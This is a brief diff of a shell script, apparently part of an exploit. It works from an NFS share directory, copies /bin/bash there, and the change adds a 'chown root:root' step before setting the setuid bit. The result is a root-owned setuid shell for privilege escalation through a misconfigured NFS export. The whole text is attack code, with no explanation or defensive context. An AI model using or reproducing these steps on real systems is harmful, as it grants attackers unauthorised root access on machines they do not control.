@@ -8,5 +8,7 @@ cd /tmp/nfsdir
 # copy wanted shell 
 cp /bin/bash . 	
 
+
 # set suid permission
+chown root:root bash
 chmod +s bash
